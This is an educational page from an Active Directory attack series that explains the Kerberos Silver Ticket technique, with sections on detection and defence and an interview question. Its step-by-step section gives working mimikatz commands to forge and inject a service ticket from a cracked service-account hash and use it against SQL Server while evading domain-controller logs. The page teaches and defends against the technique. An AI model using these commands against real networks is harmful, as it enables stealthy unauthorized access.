# 08 — Silver Ticket Attack

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Advanced  
> **Protocol exploited:** Kerberos (Service account key)

---

## 📌 What is a Silver Ticket?

A Silver Ticket is similar to a Golden Ticket — but instead of forging a TGT using KRBTGT, it forges a **service ticket** using a **service account's password hash**.

| | Golden Ticket | Silver Ticket |
|---|---|---|
| **Key used** | KRBTGT hash | Service account hash |
| **Access** | Any service in domain | ONE specific service |
| **KDC contact** | Yes (for service tickets) | NO — bypasses KDC entirely |
| **Detectability** | Harder to detect (no KDC) | Very hard (no DC logs) |
| **Prerequisite** | Domain Admin | Service account hash (Kerberoasting) |

---

## ⚙️ Step-by-Step Attack

```
Scenario: Attacker Kerberoasted svc_sql and cracked its password.
          Now creates a Silver Ticket for SQL Server access.

Step 1: Get service account hash (from Kerberoasting or PtH)
  svc_sql NTLM hash: a1b2c3d4e5f6...

Step 2: Get domain SID
  Get-ADDomain | Select-Object DomainSID

Step 3: Create Silver Ticket for SQL Server
  mimikatz # kerberos::golden
    /user:FakeDBAdmin         ← fake user claiming to be SQL admin
    /domain:company.local
    /sid:S-1-5-21-...
    /target:sqlserver01.company.local   ← target server
    /service:MSSQLSvc                   ← target service
    /rc4:a1b2c3d4e5f6...               ← svc_sql NTLM hash
    /groups:512
    /ticket:silver.kirbi

Step 4: Inject and use
  kerberos::ptt silver.kirbi
  
  # Connect to SQL as FakeDBAdmin
  sqlcmd -S sqlserver01.company.local -Q "SELECT @@VERSION"
  ← Authenticated as SA-level via forged service ticket ✅

Why Silver Ticket is stealthy:
  Service ticket goes DIRECTLY to the service (SQL Server)
  The Domain Controller is NEVER contacted
  → No Event ID 4769 on DC (no service ticket request)
  → Only evidence is on SQL Server itself (if auditing enabled)
```

---

## 🔍 Detection

```
Silver Tickets bypass DC logging entirely.
Detection must happen at the TARGET SERVICE:

  SQL Server: Enable login auditing
  Event ID 4624 on target server (logon events)
  → Look for accounts that do not exist in AD
  → Look for accounts accessing services they have never used

Defender for Identity:
  → "Forged PAC" detection
  → Validates PAC (Privilege Attribute Certificate) in service tickets

Enable PAC validation on services:
  Reg: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters
  ValidateKdcPacSignature = 1 (enabled by default on 2012 R2+)
```

---

## 🛡️ Defence

```
1. Protect service account hashes:
   → Use gMSA (240-bit password — Silver Ticket uncrackable even if captured)
   → Rotate service account passwords regularly
   → Add service accounts to Protected Users (reduces ticket lifetime)

2. Enable PAC validation on all services

3. Monitor target services for unknown account names in logon events

4. Limit service account privileges:
   svc_sql should only have permissions on its own database
   Not Domain Admin or sysadmin on all SQL instances
```

---

## 🎯 Key Interview Question

**Q: Why is a Silver Ticket harder to detect than a Golden Ticket?**  
**A:** A Golden Ticket must be presented to the KDC to obtain service tickets — generating Event ID 4769 on the DC. A Silver Ticket is a forged service ticket that goes directly to the target service, completely bypassing the KDC. No DC logs are generated at all. Detection must occur at the target service level — looking for account names in service logon events that do not exist in AD, or using Defender for Identity's PAC validation.

---

*"A Silver Ticket is the quietest attack in the Kerberos arsenal. No DC logs, no replication traffic — just a forged ticket going directly to a service. Protect service account hashes with the same urgency as the KRBTGT key."*
